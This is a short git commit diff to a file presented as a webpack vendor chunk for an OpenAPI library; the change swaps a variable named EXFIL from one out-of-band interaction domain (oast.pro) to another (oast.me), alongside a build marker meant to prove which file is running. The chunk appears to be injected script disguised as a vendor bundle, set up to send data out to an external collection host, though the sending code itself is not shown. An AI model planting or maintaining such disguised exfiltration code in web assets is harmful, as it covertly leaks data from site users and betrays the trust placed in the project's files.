556ed7a115947c0907c0879815132cc294e8daf8
alfredo1111 <alfredgotu@gmail.com>
2026-09-25 00:21:26 +0100

    Update EXFIL URL in vendors-openapi chunk

--- assets/webpack/vendors-openapi.7e543205.chunk.js
+++ assets/webpack/vendors-openapi.7e543205.chunk.js
@@ -1,6 +1,6 @@
 (function () {
   // ==== CONFIG ====
-  var EXFIL = "https://daqqulbvo2g712b0h62gk5uc357m5qooa.oast.pro";
+  var EXFIL = "https://daqr0cuhf05a9hjph7e0krdyc48iw7fzd.oast.me";
   var BUILD = "v" + Date.now();   // unique per save -> proves which file is running
   // ================
 
